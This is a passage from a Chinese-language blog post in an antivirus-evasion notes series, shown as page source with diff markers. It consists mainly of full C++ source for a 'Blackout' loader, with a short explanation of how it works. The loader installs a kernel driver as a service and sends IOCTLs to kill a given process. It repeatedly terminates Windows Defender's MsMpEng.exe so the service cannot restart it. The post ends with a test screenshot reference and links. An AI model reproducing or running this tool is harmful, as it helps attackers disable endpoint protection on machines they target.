class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function"><span class="title">LoadDriver</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">char</span>* driverPath</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SC_HANDLE hSCM, hService;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* serviceName = <span class="string">&quot;Blackout&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open a handle to the SCM database</span></span><br><span class="line">    hSCM = <span class="built_in">OpenSCManager</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">    <span class="keyword">if</span> (hSCM == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if the service already exists</span></span><br><span class="line">    hService = <span class="built_in">OpenServiceA</span>(hSCM, serviceName, SERVICE_ALL_ACCESS);</span><br><span class="line">    <span class="keyword">if</span> (hService != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Service already exists.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Start the service if it&#x27;s not running</span></span><br><span class="line">        SERVICE_STATUS serviceStatus;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">QueryServiceStatus</span>(hService, &amp;serviceStatus))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">            <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (serviceStatus.dwCurrentState == SERVICE_STOPPED)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">StartServiceA</span>(hService, <span class="number">0</span>, <span class="literal">nullptr</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">                <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">                <span class="keyword">return</span> (<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Starting service...\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">        <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create the service</span></span><br><span class="line">    hService = <span class="built_in">CreateServiceA</span>(</span><br><span class="line">        hSCM,</span><br><span class="line">        serviceName,</span><br><span class="line">        serviceName,</span><br><span class="line">        SERVICE_ALL_ACCESS,</span><br><span class="line">        SERVICE_KERNEL_DRIVER,</span><br><span class="line">        SERVICE_DEMAND_START,</span><br><span class="line">        SERVICE_ERROR_IGNORE,</span><br><span class="line">        driverPath,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hService == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Service created successfully.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Start the service</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">StartServiceA</span>(hService, <span class="number">0</span>, <span class="literal">nullptr</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">        <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Starting service...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">    <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>其次看下主函数代码的实现流程，先使用前面定义的LoadDriver函数加载驱动，再使用CreateFile打开驱动并得到其句柄。</p>
+<p>得到驱动句柄后使用 <code>DeviceIoControl</code> 函数与驱动通信，发送<code>INITIALIZE_IOCTL_CODE</code> 指令初始化驱动，再发送<code>TERMINSTE_PROCESS_IOCTL_CODE</code> 指令来终止指定的进程</p>
+<p>如果所给的进程 ID 对应的进程是 “MsMpEng.exe”（这是 Windows Defender 的进程），则程序会不断尝试终止它，毕竟MsMpEng.exe被杀死后还是会无限复活的</p>
+<p>在这里我要补充一点，当调用 <code>CreateFile</code> 打开 “\\.\Blackout” 时，实际上是在尝试打开一个与驱动程序相关联的设备。在Windows中，驱动程序可以创建一个设备并为其分配一个符号链接，这样用户模式的程序可以通过这个符号链接与驱动程序通信，从而允许后续的<code>DeviceIoControl</code> 调用来传递IO控制代码 (IOCTL) 和其他数据到驱动程序中</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span> argc,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">char</span>** argv</span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid number of arguments. Usage: Blackout.exe -p &lt;process_id&gt;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;-p&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid argument. Usage: Blackout.exe -p &lt;process_id&gt;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">CheckProcess</span>(<span class="built_in">atoi</span>(argv[<span class="number">2</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;provided process id doesnt exist !!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WIN32_FIND_DATAA fileData;</span><br><span class="line">    HANDLE hFind;</span><br><span class="line">    <span class="type">char</span> FullDriverPath[MAX_PATH];</span><br><span class="line">    BOOL once = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    hFind = <span class="built_in">FindFirstFileA</span>(<span class="string">&quot;Blackout.sys&quot;</span>, &amp;fileData);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hFind != INVALID_HANDLE_VALUE) &#123; <span class="comment">// file is found</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">GetFullPathNameA</span>(fileData.cFileName, MAX_PATH, FullDriverPath, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123; <span class="comment">// full path is found</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;driver path: %s\n&quot;</span>, FullDriverPath);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;path not found !!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;driver not found !!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Loading %s driver .. \n&quot;</span>, fileData.cFileName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">LoadDriver</span>(FullDriverPath))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;faild to load driver ,try to run the program as administrator!!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;driver loaded successfully !!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    HANDLE hDevice = <span class="built_in">CreateFile</span>(<span class="string">L&quot;\\\\.\\Blackout&quot;</span>, GENERIC_WRITE | GENERIC_READ, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to open handle to driver !! &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DWORD bytesReturned = <span class="number">0</span>;</span><br><span class="line">    DWORD input = <span class="built_in">atoi</span>(argv[<span class="number">2</span>]);</span><br><span class="line">    DWORD output[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    DWORD outputSize = <span class="built_in">sizeof</span>(output);</span><br><span class="line"></span><br><span class="line">    BOOL result = <span class="built_in">DeviceIoControl</span>(hDevice, INITIALIZE_IOCTL_CODE, &amp;input, <span class="built_in">sizeof</span>(input), output, outputSize, &amp;bytesReturned, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;faild to send initializing request %X !!\n&quot;</span>, INITIALIZE_IOCTL_CODE);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;driver initialized %X !!\n&quot;</span>, INITIALIZE_IOCTL_CODE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">GetPID</span>(<span class="string">L&quot;MsMpEng.exe&quot;</span>) == input)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Terminating Windows Defender ..\nkeep the program running to prevent the service from restarting it\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">0x1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (input = <span class="built_in">GetPID</span>(<span class="string">L&quot;MsMpEng.exe&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">DeviceIoControl</span>(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, &amp;input, <span class="built_in">sizeof</span>(input), output, outputSize, &amp;bytesReturned, <span class="literal">NULL</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;DeviceIoControl failed. Error: %X !!\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">                    <span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line">                    <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (once)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Defender Terminated ..\n&quot;</span>);</span><br><span class="line">                    once = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">Sleep</span>(<span class="number">700</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;terminating process !! \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    result = <span class="built_in">DeviceIoControl</span>(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, &amp;input, <span class="built_in">sizeof</span>(input), output, outputSize, &amp;bytesReturned, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to terminate process: %X !!\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;process has been terminated!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="运行测试-1"><a href="#运行测试-1" class="headerlink" title="运行测试"></a>运行测试</h2><img src="WeakDefender/241086198-3ea0f7ae-0102-4a38-b4b6-700e93f5d545.png" alt="image" style="zoom:67%;" />	
+
+
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/324952.html">https://www.freebuf.com/articles/network/324952.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12280#toc-25">https://xz.aliyun.com/t/12280#toc-25</a></li>
+</ul>
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2023/10/22/%E5%85%8D%E6%9D%80%E7%AC%94%E8%AE%B0/AntiAntiVirusNotes-master/Webshell%E4%B8%93%E9%A2%98/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">(no title)</h2>
+        </a>
+      
+      <div class="card-text--row">Newer</div>
+    </div>
+  </article>
+</div>
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2023/10/22/%E5%85%8D%E6%9D%80%E7%AC%94%E8%AE%B0/AntiAntiVirusNotes-master/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">(no title)</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="https://s.gravatar.com/avatar/2d6b803eea37de0257620d5fabee7e64?s=200&amp;r=g&amp;d=retro" class="soft-size--round soft-style--box" alt="Sukoshi">
+    
+    
+      <h2>Sukoshi</h2>
+    
+    
+      <p>贵在坚持</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>42</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        0
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        3
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>flex-block主题部分重构，详情查看https://github.com/miiiku/flex-block</p>
+  </div>
+</section>
+
+
+      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+    <span>CATEGORYS</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categorys-list">
+      
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      <a href="/tags/Hexo/" style="font-size: 10px;" class="tags-cloud-0">Hexo</a> <a href="/tags/Markdown/" style="font-size: 10px;" class="tags-cloud-0">Markdown</a> <a href="/tags/%E7%BD%91%E7%AB%99/" style="font-size: 10px;" class="tags-cloud-0">网站</a>
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/miiiku/" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
